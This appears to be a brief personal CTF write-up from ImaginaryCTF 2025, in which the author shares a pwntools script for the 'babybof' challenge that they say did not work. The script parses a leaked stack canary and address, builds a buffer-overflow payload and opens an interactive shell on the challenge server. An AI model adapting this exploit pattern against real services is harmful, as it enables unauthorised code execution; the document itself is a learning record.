# imaginary ctf 2025

first ctf ever since picoctf (aka ~4 years ago)... realized that i can't even do a simple pwn/web question :(

attempted to solve the 100 pt pwn question "babybof" with the following script (it didn't work)

documenting this so that one day i can look back on this :)
``` python
from pwn import *
p = remote('babybof.chal.imaginaryctf.org', 1337)

stop_at = p.recvuntil(b'enter your input (make sure your stack is aligned!):')
lines = stop_at.split(b'\n') # [b'', b'', etc]

can_add = None
bin_add = None

for line in lines:
    if b'canary' in line:
        can_add = line[-18:]
    if b'/bin/sh' in line:
        bin_add = line[-8:]
print(can_add) # b'0x...'
print(bin_add)

base = b'A'*56
canary = p64(int(can_add, 16)) # set as base 16 (hex)
rbp = b'A'*8
address = p64(int(bin_add, 16))
payload = base + canary + rbp + address
print(payload)

p.send(payload)
p.interactive()
```
